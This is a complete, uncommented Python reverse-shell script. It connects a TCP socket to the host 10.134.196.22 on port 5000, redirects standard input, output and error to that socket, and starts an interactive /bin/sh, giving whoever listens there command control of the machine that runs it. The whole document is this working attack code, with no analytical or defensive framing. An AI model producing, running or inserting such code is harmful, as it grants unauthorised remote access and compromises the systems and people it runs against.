import socket
import subprocess
import os



s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.134.196.22",5000))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
